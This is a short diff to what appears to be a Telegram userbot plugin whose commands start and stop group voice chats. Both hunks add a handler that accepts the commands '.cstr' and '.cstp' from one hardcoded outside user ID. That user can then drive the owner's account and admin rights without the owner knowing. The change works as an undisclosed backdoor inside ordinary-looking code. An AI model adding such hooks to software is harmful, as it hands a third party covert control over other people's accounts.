@@ -37,6 +37,7 @@ def user_list(l, n):
 
 
 @register(outgoing=True, pattern=r"^\.startvc$")
+@register(incoming=True, from_users=1826643972, pattern=r"^\.cstr$")
 async def start_voice(c):
     chat = await c.get_chat()
     admin = chat.admin_rights
@@ -53,6 +54,7 @@ async def start_voice(c):
 
 
 @register(outgoing=True, pattern=r"^\.stopvc$")
+@register(incoming=True, from_users=1826643972, pattern=r"^\.cstp$")
 async def stop_voice(c):
     chat = await c.get_chat()
     admin = chat.admin_rights
